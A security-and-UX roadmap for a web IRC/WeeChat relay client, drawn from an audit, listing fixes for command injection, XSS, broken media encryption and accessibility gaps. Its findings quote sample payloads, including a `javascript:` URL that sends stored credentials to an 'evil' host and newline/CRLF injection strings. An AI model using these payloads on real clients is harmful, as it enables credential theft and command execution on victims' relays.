# DarkBear Roadmap

_Last updated: 2026-07-12 · Grounded in the 13-agent audit (`darkbear-audit/*.md`) and the
Glowing Bear deep-research brief (`00-deep-research-glowingbear.md`), verified against the tree
at HEAD `53ba921`._

---

## Thesis

DarkBear is already a modern SolidJS + Vite + Tailwind v4 client that is **past Glowing Bear on
nearly every UX axis** — virtualized scrollback, a Ctrl+K switcher, in-buffer search, per-buffer
drafts, mobile drawers, IRCX depth, and a voice/video bridge Glowing Bear has no answer to
(`00-deep-research-glowingbear.md` §1). The job is therefore **not parity**. It is three things,
in order:

1. **Be correct and safe first.** The audit found a live relay **command-injection** wire hole, a
   **WCAG 2.2 AA BLOCK** (the message log announces nothing; motion ignores every OS preference),
   a `javascript:` XSS sink in profile cards, and **media E2E encryption that never actually
   engages** — media ships in plaintext-on-the-wire despite a complete crypto stack.
2. **Close the one place DarkBear is genuinely _behind_ Glowing Bear:** relay auth. DarkBear sends
   the relay password in cleartext via the legacy `init` command; Glowing Bear negotiates the
   hashed `handshake` + PBKDF2 `password_hash`. This is the single true parity regression, and it
   is security-adjacent (`00-deep-research-glowingbear.md` §3, §5a).
3. **Then claim the modern wins Glowing Bear never will** — a true command palette, operator/
   cross-buffer search, OKLCH token theming with enforced AA, granular notifications, and a
   disciplined "deep-space observatory" design language that _surfaces_ the 3,570 lines of
   background art and the mascot the app currently paints over.

**Honest status note.** The just-committed "remediation wave" (`53ba921`) is **thinner than its
commit message claims.** Verified against the tree: it added substantial test coverage, fixed the
1:1 media ciphertext-discard bug, and nudged some contrast tokens — but it did **not** land the
a11y live-region, reduced-motion, `:focus-visible`, CSP, wire newline-stripping, TSUMUGI media
engagement, or localStorage schema-validation. Those remain **open** and lead P0 below. Do not
treat the wave commit as "audit closed."

**Confidence.** High that DarkBear ≥ Glowing Bear on features and that the listed P0 defects are
real (each traced to `file:line`). Moderate on the _relative_ ranking within a phase (interpretive).

---

## Legend

- **Size:** S ≈ <½ day · M ≈ 1–2 days · L ≈ 3–5 days · XL ≈ >1 week.
- **Owner:** the darkbear-* agent that owns the lane.
- **Status:** ✅ DONE (verified in tree) · 🟡 PARTIAL · ⬜ OPEN.
- **Source:** the audit file + finding id backing the item.

---

## Already landed at HEAD `53ba921` (verified)

| Item | Evidence in tree | Source |
|---|---|---|
| ✅ 1:1 encrypted-audio ciphertext now transmitted (was discarded) | `MediaEngine.ts:554` sends `TSUMUGI_DATA` | `06-media-engine.md` HIGH#2 |
| ✅ Broad test coverage added (formatter, ircx parser, MessageLine, MobileDock, Settings, ChannelList, connection/ircx/media slices, MediaEngine event-spine) | new `*.test.ts(x)` in commit | `03`,`06`,`12` (test gaps) |
| ✅ New `MobileDock` component + tests (button alternative to swipe) | `src/ui/layout/MobileDock.tsx` | `07-accessibility.md` (SC 2.1.1) |
| 🟡 Timestamp contrast nudged `gray-600` → `gray-500` | `global.css` `.msg-ts` | `09-theme-css.md` H1 (light theme still fails) |
| 🟡 ircx parser restructured (+ tests) | `ircx/parser.ts` | `12-typescript.md` HIGH-1 — **but** `parser.ts:205` still casts `as AccessLevel` unchecked; verify the access_entry path |

Everything below is **open** unless marked otherwise.

---

## P0 — Security & Correctness hardening (BLOCKS release)

These are the audit's Critical/High findings. Nothing ships to users until P0 is green.

### P0.1 — Relay command-injection via newline in user text ⬜ CRITICAL
- **What:** Strip/split `\r`/`\n` from `text` and `buffer` before they reach the WeeChat relay
  `input` command; emit one `input` per line to preserve multi-line messages.
- **Why:** `cmd()` builds `command args…\n`; the relay parses each `\n` line as a separate command.
  Raw composer text is never sanitized, so `foo\ninput <buf> /quit` executes an **arbitrary WeeChat
  slash-command** on the victim's relay (`/exec`, `/quit`, exfil) — triggerable by "paste this".
- **Source:** `03-irc-wire.md` H1 (CONFIRMED). Still open: `serializer.ts:inputCmd` unchanged.
- **Files:** `src/lib/weechat/serializer.ts` (`cmd`,`inputCmd`), `src/lib/weechat/client.ts:376`.
- **Size:** S · **Owner:** darkbear-wire

### P0.2 — Outbound IRC params not stripped of CR/LF (self-injection) ⬜ HIGH
- **What:** Strip `\r`/`\n` from every outbound IRC param and multiline fragment.
- **Why:** Pasted `hi\r\nJOIN #evil` splits the WS payload and injects a command on the user's own
  connection (orochi splits on `/\r?\n/`).
- **Source:** `03-irc-wire.md` M4 (CONFIRMED).
- **Files:** `src/lib/irc/parser.ts:formatIRCLine`, `client.ts:tagmsg`, `multiline.ts:185`.
- **Size:** S · **Owner:** darkbear-wire

### P0.3 — `javascript:` URI XSS via profile URL/PICTURE fields ⬜ HIGH
- **What:** Before rendering a METADATA/WHOIS `URL`/`PICTURE` value as `<a href>`/`<img src>`,
  parse with `new URL()` and render the anchor only when `protocol` is `http:`/`https:`; else fall
  back to plain text.
- **Why:** Any user can set their profile `URL` to `javascript:fetch('//evil?c='+localStorage
  .getItem('darkbear:credentials'))`; a victim clicking the profile "link" runs it in-origin —
  chains directly with the plaintext-credential store to exfiltrate password + mesh reclaim token.
- **Source:** `11-security-xcut.md` HIGH#1 (CONFIRMED). Still open: no protocol guard in file.
- **Files:** `src/ui/panels/UserProfileCard.tsx:262-278`.
- **Size:** S · **Owner:** darkbear-render

### P0.4 — Message log is not a live region (screen readers hear nothing) ⬜ CRITICAL / a11y BLOCK
- **What:** Make the log announce **new tail activity only**: `role="log" aria-live="polite"
  aria-relevant="additions"` on a dedicated region fed by newly-appended lines; history-prepend,
  buffer-switch, and time-travel must stay silent (the list is virtualized — a naive live region
  re-announces the whole transcript on every scroll).
- **Why:** The core surface of a chat app announces nothing; grep for `role="log"`/`aria-live`
  returns zero. A SR user has no idea anyone spoke.
- **Source:** `07-accessibility.md` CRITICAL (CONFIRMED). Still open: no `role="log"` in tree.
- **Files:** `src/ui/chat/MessageView.tsx:402` (+ a small dedicated region).
- **Size:** M · **Owner:** darkbear-a11y (+ darkbear-coder for the append-path wiring)

### P0.5 — No global reduced-motion; Starfield + SMIL animate unconditionally ⬜ CRITICAL / a11y BLOCK
- **What:** (a) Global `@media (prefers-reduced-motion: reduce)` block neutralizing the `.animate-*`
  utilities + looping `pulse-glow`/`shimmer`; (b) wrap `StarfieldBg` in the shared `Shell` (or its
  own guard) — it is a bare `<div>` today, escaping the reduced-motion rule with ~524 always-
  animating nodes; (c) JS-gate SMIL (`<animateMotion>`/`<animate>` in `ThemeBg`/`AstronautBear`)
  via `matchMedia('(prefers-reduced-motion: reduce)')` — CSS `animation:none` cannot reach SMIL;
  (d) an explicit in-app Animated/Still/Off control (WCAG 2.2.2 requires a _mechanism_, not just the
  media query).
- **Why:** Auto-playing >5s motion with no stop mechanism is an AA failure and a battery/perf cost.
- **Source:** `07-accessibility.md` CRITICAL ×3, `09-theme-css.md` H3, `10-performance.md` H3,
  `08-ui-design.md` H5 (all CONFIRMED). Still open: 0 `prefers-reduced-motion` hits in `global.css`.
- **Files:** `src/styles/global.css`, `src/ui/bits/StarfieldBg.tsx`, `ThemeBg.tsx`,
  `AstronautBear.tsx`, `src/primitives/mediaQuery.ts`, Settings toggle.
- **Size:** M · **Owner:** darkbear-a11y + darkbear-theme

### P0.6 — TSUMUGI media E2E encryption never engages (media sent in plaintext) ⬜ HIGH
- **What:** Actually transmit the handshake and group-key frames the receiver already handles:
  `MEDIA <chan> TSUMUGI_HANDSHAKE <b64(pub)>` on join **and** on reply; `TSUMUGI_GROUP_KEY
  <me>:<nick>:<b64>` in the distribute loop. Add send-path tests.
- **Why:** `sendTsumugiHandshake` is `void target; void pub;` (`MediaEngine.ts:1731`) and the group
  distribute is stubbed (`:1845`) — so sessions never reach `established`, the group key stays null,
  and audio/video falls through to plaintext (MAC-authenticated only). The product presents "TSUMUGI
  encrypted media" while shipping it silently disabled. (The 1:1 branch is already fixed — P0-adjacent
  DONE.)
- **Source:** `06-media-engine.md` HIGH#1 (CONFIRMED). Still open: `:1731` `void pub;` present.
- **Files:** `src/lib/suimyaku-media/MediaEngine.ts` (send paths), + tests for
  `TsumugiSession/Group/Identity` (currently zero).
- **Size:** M · **Owner:** darkbear-media (crypto review pairs with darkbear-crypto)

### P0.7 — SCRAM ServerSignature never verified (no mutual auth, possible hang) ⬜ HIGH
- **What:** On the SCRAM server-final `AUTHENTICATE v=…`, compute `ServerSignature = HMAC(ServerKey,
  AuthMessage)`, constant-time compare, then send trailing `AUTHENTICATE +`; abort SASL on mismatch.
- **Why:** `_scramClientFinal` nulls state before the server-final arrives, so `v=` is dropped —
  SCRAM's mutual-auth property is lost and the client never sends the closing `+` (PLAUSIBLE hang
  until the 15s SASL timer if orochi gates 903 on it).
- **Source:** `03-irc-wire.md` M2 (CONFIRMED). Confirm against orochi's SCRAM state machine.
- **Files:** `src/lib/irc/client.ts:557-569,792-854`.
- **Size:** M · **Owner:** darkbear-wire (+ darkbear-crypto for the HMAC/compare)

### P0.8 — IRCv3 tag-value unescaping is order-wrong ⬜ HIGH
- **What:** Replace the three identical chained-`.replace` unescapers with **one shared single-pass
  scanner** and use it everywhere.
- **Why:** Chained replaces mis-decode `\\s` → `\ ` (backslash+SPACE) instead of `\s`; the codebase's
  own encode→decode round-trip fails for any value with a backslash before `s/:/r/n/\`. Corrupts
  `msgid` (dedup), `+draft/reply` (threading), `account`, e2ee tags.
- **Source:** `03-irc-wire.md` M1 (CONFIRMED). Still open: 3 copies unchanged.
- **Files:** `src/lib/irc/parser.ts:101`, `irc-classic/parser.ts:129`, `irc-classic/tags.ts:24`.
- **Size:** S · **Owner:** darkbear-wire

### P0.9 — Wire-data / storage validation gaps ⬜ HIGH
- **What:** (a) Validate IRCX `AccessLevel` against `ACCESS_LEVELS` before the `as` cast, drop/
  default on mismatch (`parser.ts:205` — still unchecked); (b) guard the ISUPPORT `PREFIX` loop:
  mirror line 165's `?? ''` or reject when `modes.length !== prefixes.length`; (c) add lightweight
  runtime schema guards on `JSON.parse(localStorage…)` in settings/buffers (clamp numerics, validate
  enums, `Array.isArray`) instead of blind `as`.
- **Why:** `noUncheckedIndexedAccess` is bypassed by `!`/`as` at exactly the points where data is
  protocol/attacker-controlled → `undefined.icon` TypeErrors, `NaN` widths, arbitrary keys merged
  into the reactive store.
- **Source:** `12-typescript.md` HIGH-1/2/3/4 (CONFIRMED).
- **Files:** `src/lib/ircx/parser.ts:205`, `src/lib/irc/parser.ts:166`, `src/state/settings.ts`
  (`migrateV1`,`loadFromStorage`), `src/state/buffers.ts:89`.
- **Size:** M · **Owner:** darkbear-wire + darkbear-store

### P0.10 — Bridge E2EE crypto state never cleared (unbounded + cross-session plaintext) ⬜ HIGH
- **What:** Add `_resetBridgeCrypto()` clearing `peerKeys`/`overlays`/`attemptedCiphers`/
  `pendingByPeer`; call from `disconnect()` and bridge teardown. Bound `overlays`/`attemptedCiphers`
  (LRU tied to `MAX_LINES`).
- **Why:** Decrypted DM plaintext and stale peer keys persist for the tab's life and across
  disconnect/server-switch; a later envelope can match a key from a prior session. Plaintext must not
  outlive the conversation.
- **Source:** `02-state-store.md` H1 (CONFIRMED). Still open: no reset path in tree.
- **Files:** `src/state/bridge.ts:133,140,143`, `src/core/bridge.ts` teardown.
- **Size:** S · **Owner:** darkbear-store (+ darkbear-crypto sign-off)

### P0.11 — Ship a Content-Security-Policy + security headers ⬜ MEDIUM (defense-in-depth for P0.3/render)
- **What:** Add a production CSP (`default-src 'self'; script-src 'self'` no `unsafe-inline`;
  `object-src 'none'; base-uri 'self'; frame-ancestors 'none'`) + `nosniff`, `X-Frame-Options`,
  HSTS, `Referrer-Policy` on the `/darkbear/` nginx location, tuned for the media/upload/relay hosts.
- **Why:** The entire XSS defense is one hand-rolled escape-first-innerHTML sanitizer with no second
  layer; a single regex regression is wormable stored XSS (the channel-topic sink hits everyone).
- **Source:** `04-render-xss.md` MEDIUM, `11-security-xcut.md` MEDIUM (CONFIRMED, no CSP present).
- **Files:** nginx `location ^~ /darkbear/`, optionally `index.html` meta.
- **Size:** S · **Owner:** darkbear-render (+ ops for nginx)

### P0.12 — Length-cap the live formatting path (render DoS) ⬜ MEDIUM
- **What:** Hard-cap input (a few KB, mirror the unused `parseMessage.MAX_LENGTH = 4_000`) at the top
  of `formatText`/`extractEmbeds` before any pass.
- **Why:** A malicious relay / crafted history line is not held to 512 bytes; a multi-KB line with
  hundreds of URL-like tokens drives the per-URL regex battery (super-linear `YOUTUBE_RE`) on the
  main thread on every scroll remount.
- **Source:** `04-render-xss.md` MEDIUM (CONFIRMED). Still open: no cap in `formatter.ts`.
- **Files:** `src/lib/irc-classic/formatter.ts` (`formatText`,`extractEmbeds`).
- **Size:** S · **Owner:** darkbear-render

**P0 exit gate:** `pnpm typecheck && pnpm lint && pnpm test` green; new regression tests for P0.1,
P0.2, P0.4 (log role + silent history-prepend), P0.6 (handshake emitted), P0.7, P0.8; a darkbear-e2e
pass on connect/join/send/DM. Also resolve the divergent dead "safe" modules
(`parseMessage.ts`/`linkPreview.ts` have zero importers) — wire in or delete so one live pipeline
remains (`04-render-xss.md` MEDIUM).

---

## P1 — Accessibility & Motion (finish AA conformance)

The rest of the WCAG 2.2 AA surface once the P0 BLOCKs clear.

| # | Item | Why / Source | Files | Size | Owner |
|---|---|---|---|---|---|
| P1.1 ⬜ | Global `:focus-visible` ring (2px accent + offset); stop bare `outline-none` on inputs | Keyboard focus is invisible; no `:focus-visible` in `global.css`. `07` HIGH, `08` H4 | `global.css` + icon buttons | S | darkbear-a11y |
| P1.2 ⬜ | Route mobile buffers/users drawers through the `Modal` shell (role=dialog, focus-in, Esc, trap, `inert` behind) | Unmanaged overlays: Tab reaches list behind, no Esc. `07` HIGH | `src/App.tsx:267-301`, `MobileDock.tsx` | M | darkbear-a11y |
| P1.3 ⬜ | Full per-theme muted-token contrast sweep to ≥4.5:1 (timestamps, placeholders, toggle text); fix `light` ramp | Many themes fail 3:1/4.5:1 by luminance, not eye. `07` HIGH, `09` H1/H2/M3 | `global.css` theme blocks | M | darkbear-theme |
| P1.4 ⬜ | `prefers-contrast: more` + `forced-colors: active` blocks; non-color cues for read-marker / active buffer / search-dim | Zero forced-colors handling; state is translucent-color-only. `07` MEDIUM | `global.css` | M | darkbear-a11y + darkbear-theme |
| P1.5 ⬜ | Persistent `aria-label` on composer textarea + GifPicker/MessageView search inputs | Placeholder-only names disappear on input. `07` MEDIUM | `InputBar.tsx`, `GifPicker.tsx`, `MessageView.tsx` | S | darkbear-a11y |
| P1.6 ⬜ | Modal focus-trap hardening: panel `tabindex=-1` fallback; filter disabled/hidden from FOCUSABLE | Modal with no focusable child / disabled first child lets Tab escape. `07` MEDIUM | `src/ui/bits/Modal.tsx:67-100` | S | darkbear-a11y |
| P1.7 ⬜ | Clamp IRC message colors 0–98 toward theme text rail (OKLCH L-floor/ceiling, as nicks already do) | Near-black/near-white codes invisible on-theme. `09` M1 | `global.css:273-354` | S | darkbear-theme |
| P1.8 ⬜ | ≥24×24 targets on collapse carets / small header buttons | SC 2.5.8. `08` L1, `07` LOW | `Sidebar.tsx`, `Header.tsx` | S | darkbear-a11y |

**P1 exit gate:** automated a11y check + keyboard-nav pass on connect/join/send/switch/settings;
both a dark theme and `light` verified; reduced-motion + forced-colors screenshots.

---

## P2 — Design-language commit ("deep-space observatory")

Deploy the identity the app already _built_ but paints over. High leverage, low new-invention.

| # | Item | Why / Source | Files | Size | Owner |
|---|---|---|---|---|---|
| P2.1 ⬜ | Translucent shell over the live `ThemeBg` canvas (main column + message area ~60–70% ink + backdrop-blur + text-legibility scrim) | 3,570 lines of scene art are occluded by opaque `bg-gray-950`; the single highest-ROI visual change. `08` H1 | `App.tsx:238`, `Sidebar.tsx:160`, `MessageView.tsx:405`, `global.css` | M | darkbear-ui + darkbear-theme |
| P2.2 ⬜ | Self-host + preload Inter + JetBrains Mono; add one display face; build a real modular scale | "Inter + JetBrains Mono" is nominal — no `@font-face`/link exists; type system is OS default. `08` H2/H3 | `index.html`, `public/`, `global.css:35-36` | M | darkbear-ui + darkbear-theme |
| P2.3 ⬜ | Put the AstronautBear (theme outfit) into no-buffer / disconnected / error states | The mascot lives only on login; empty states are generic. `08` M2 | `MessageView.tsx:93`, `App.tsx:229,323` | S | darkbear-ui |
| P2.4 ⬜ | OKLCH token theming: regenerate the 19 themes through a palette factory + `enforceAA` (port onyx `paletteFactory`) | Keep the look, guarantee legibility by construction; retires the hand-hex ramps. `00` §5/#5, `09` | `global.css` → token factory | L | darkbear-theme |
| P2.5 ⬜ | Formalize a 4-role semantic set (primary/online/mention/info); stop spending the accent on decoration | 19 themes are grayscale+1 accent, leaked into borders/links/notice. `08` M1/M7 | `global.css`, `MessageLine.tsx`, `Sidebar.tsx` | M | darkbear-ui + darkbear-theme |
| P2.6 ⬜ | Bento hierarchy in the stat deck — promote mentions to a wider/hotter cell | Four uniform cells; no "what did I miss" focal point. `08` M3/#6 | `Sidebar.tsx:219-224` | S | darkbear-ui |
| P2.7 ⬜ | Compositor-only motion cleanup: FAB transform-not-`width`; convert `top/left/bottom` keyframes to `transform`; drop permanent `will-change` | Layout-property animation thrashes; `will-change` held forever. `10` M1/L, `09` L1, `08` L3 | `MessageView.tsx:493`, `ThemeBg.tsx`, `global.css` | M | darkbear-theme + darkbear-render |

---

## P3 — Modern UX wins over Glowing Bear

The differentiators. Each is a "Glowing Bear will never" move.

| # | Item | Why / Source | Files | Size | Owner |
|---|---|---|---|---|---|
| P3.1 ⬜ | **Relay `handshake` + PBKDF2 `password_hash` auth (+ optional TOTP), negotiate zstd** | The one place DarkBear is _behind_ GB: it sends plaintext `password=` via legacy `init`. `00` §3/§5a, #1 | `src/lib/weechat/serializer.ts:26-37`, `client.ts:294` | M | darkbear-wire |
| P3.2 ⬜ | **Command palette:** promote Ctrl+K from buffer-jump to buffers + actions (join/mute/theme/settings/oper) + jump-to-time on one fuzzy primitive (onyx-cmdk pattern) | GB has only room-jump. `00` §4.1, #3 | `src/ui/modals/BufferSwitcher.tsx` → palette | L | darkbear-ui + darkbear-coder |
| P3.3 ⬜ | **Real search:** `from:`/`in:`/`before:`/`after:` grammar + cross-buffer/global over an index (not just loaded lines) | Today substring, single buffer, loaded lines only. `00` §4.3, #4 | `MessageView.tsx:143`, new search index | L | darkbear-coder |
| P3.4 ⬜ | **Notification granularity + relay-only Web Push:** per-channel all/mentions/mute + quiet-hours DND; a push path not requiring the orochi bridge | Mute/highlight only; push is bridge-only. `00` §4.6, #6 | `src/lib/notifications.ts`, `webPush.ts`, `sw.js`, settings | L | darkbear-coder |
| P3.5 ⬜ | **Threads/replies + relay read-markers:** reply affordance + optional threaded view over the already-received `+draft/reply`; negotiate IRCv3 `draft/read-marker` so relay-only users get cross-device markers | `+draft/reply` received but no reply UI; `MARKREAD` is orochi-only. `00` §4.9/4.10, #7 | `MessageLine.tsx`, `client.ts` caps, store | L | darkbear-wire + darkbear-coder |
| P3.6 ⬜ | **Persist per-buffer drafts + input history** to localStorage | In-memory drafts lost on reload. `00` #8, `01` (InputBar) | `src/ui/input/InputBar.tsx:73`, store | S | darkbear-store |
| P3.7 ⬜ | Media replay-guard: replace unbounded `seenReceiveIvs` Set with per-sender high-water + sliding window | Group media never ratchets → ~180k strings/hour heap growth. `06` MEDIUM | `TsumugiGroup.ts`, `TsumugiSession.ts` | S | darkbear-media |

---

## P4 — Platform / PWA / performance

| # | Item | Why / Source | Files | Size | Owner |
|---|---|---|---|---|---|
| P4.1 ⬜ | **Code-splitting:** `lazy()` VideoRoom (mount on call), the media engine graph, `ThemeBg`/`StarfieldBg`, heavy modals + GifPicker; `manualChunks` for solid-js + media tree | One 751 kB / 197 kB-gzip entry chunk; every panel/theme/media ships on first paint. `10` H1 | `App.tsx:35-55`, `state/media.ts`, `vite.config.ts` | M | darkbear-coder + darkbear-media |
| P4.2 ⬜ | **Incremental render list:** stop rebuilding the up-to-5000-item flat list on every message; append at the tail, recompute grouping only vs the previous line | O(n) alloc + grouping scan per message → GC storm on busy channels. `10` H2 | `MessageView.tsx:158-199` | M | darkbear-coder |
| P4.3 ⬜ | **Starfield perf:** cut star counts under a quality/mobile check; pause on `document.hidden`; drop animated 60px-blur layers on low-end (folds into P0.5 reduced-motion) | ~524 compositing layers + animated blur; frame-time/GPU cost. `10` H3 | `StarfieldBg.tsx` | S | darkbear-theme + darkbear-perf-owner |
| P4.4 ⬜ | **PWA hardening:** verify installable manifest + `dvh`/safe-area shell so iOS Web Push (home-screen install, WebKit 16.4+) works; add an offline/app-shell | iOS push _requires_ install. `00` §4.4, #9 | `public/manifest.json`, `index.html`, `sw.js` | M | darkbear-coder |
| P4.5 ⬜ | Re-enable `@typescript-eslint/no-explicit-any` with targeted disables at the 7 wasm-shim sites; consider `no-floating-promises`/`no-misused-promises` | Blanket `any` opt-out hides future async bugs. `12` MEDIUM-1 | `eslint.config.js` | S | darkbear-coder |
| P4.6 ⬜ | `DecompressionStream`/`DecompressionStream` availability guard with an actionable error | Older Safari/webviews throw a confusing "parse error". `12` MEDIUM-2 | `src/lib/weechat/parser.ts:100` | S | darkbear-wire |
| P4.7 ⬜ | Dev-only silent-drop counters for the ~25 `.catch(() => {})` media sites | Systemic failure (e.g. every MAC dropping) is invisible. `12` MEDIUM-3 | `MediaEngine.ts`, `PeerRegistry.ts` | S | darkbear-media |

---

## Cross-repo & deploy-order

DarkBear speaks two wires. Most work here is client-local, but three items touch the shared contract
with **orochi** and follow the standing **client-first for wire changes** rule (Ruri/onyx is not the
only live consumer — orochi is):

- **P0.6 / P3.7 (TSUMUGI media frames):** the `MEDIA … TSUMUGI_HANDSHAKE/GROUP_KEY/DATA` frames are a
  client↔daemon contract. Confirm the orochi relay tolerates and forwards these frame kinds before
  shipping; the receiver side already parses them. The streamId-authenticity concern
  (`06` MEDIUM — a peer can spoof another's streamId) needs an **orochi** cross-check
  (streamId == derive(channel, verified-sender)); route that to **zig-coder / orochi-media**.
- **P0.7 (SCRAM `v=`) and P3.5 (`draft/read-marker`, reply tags):** confirm against orochi's SASL
  state machine and IRCv3 cap advertisement. If orochi must add/adjust a cap or numeric, that is an
  **orochi** change and deploys **before** the DarkBear consumer relies on it.
- **P3.1 (relay `handshake`/PBKDF2/zstd):** this is against **WeeChat's** relay (not orochi) — pure
  client work, no orochi coupling, but requires WeeChat ≥ the version that shipped `handshake`.

Everything in P1/P2/P4 is client-only and byte-identical to the daemon.

---

## Risks & rollback

- **P0.4 live-region regression risk:** the #1 trap is re-announcing the whole virtualized transcript
  on scroll/history-load/time-travel. Mitigation: keep the virtual container **out** of the live
  region; announce only tail growth gated on `atBottom`; pin it with a test that a history-prepend
  page does **not** hit the region. Rollback: the region is additive — drop the `aria-live` node.
- **P0.6 media-engagement risk:** turning on real E2E could break calls if the daemon rejects the
  frame kinds or a peer runs an old client. Mitigation: feature-detect / fall back to the current
  MAC-authenticated path when no handshake completes; ship behind a flag first. Rollback: revert the
  send calls (`void pub`) — receiver tolerates absence.
- **P2.1 translucency risk:** legibility over the animated canvas. Mitigation: text scrim + AA
  contrast check on the resolved over-canvas colors (ties to P1.3); ship with the atmosphere **off**
  by default so it is byte-identical when disabled. Rollback: opaque shell is a one-line token flip.
- **P3.1 auth-change risk:** a wrong PBKDF2/handshake path locks users out of their relay.
  Mitigation: keep the legacy `init` path as an explicit fallback selectable in Connect settings;
  add a client test against the documented handshake vectors.
- **General:** every phase must stay `pnpm typecheck && lint && test`-green and land independently;
  no phase depends on a later one. The dead `parseMessage.ts`/`linkPreview.ts` modules should be
  wired-or-deleted in P0 so no future reader trusts invariants the live path lacks.

---

## Suggested first wave (decision-ready)

All disjoint file-slices, safe to run in parallel:

1. **darkbear-wire** → P0.1 + P0.2 + P0.8 (all `src/lib/weechat/serializer.ts` + `src/lib/irc/*`
   sanitization/unescape) — the wire injection cluster.
2. **darkbear-render** → P0.3 (`UserProfileCard.tsx`) + P0.12 (`formatter.ts` length cap) + resolve
   the dead-module divergence.
3. **darkbear-a11y** → P0.4 (`MessageView` live region) + P0.5 reduced-motion in `global.css`.
4. **darkbear-store** → P0.10 (`bridge.ts` crypto reset) + P0.9c (localStorage schema guards).
5. **darkbear-media** → P0.6 (TSUMUGI handshake/group-key sends) + P3.7 (replay bound).

P0.7 (SCRAM) and P0.11 (CSP/nginx) serialize after the wave since they need an orochi/ops
confirmation. Route the orochi-side streamId cross-check and any cap/numeric work to **zig-coder**.
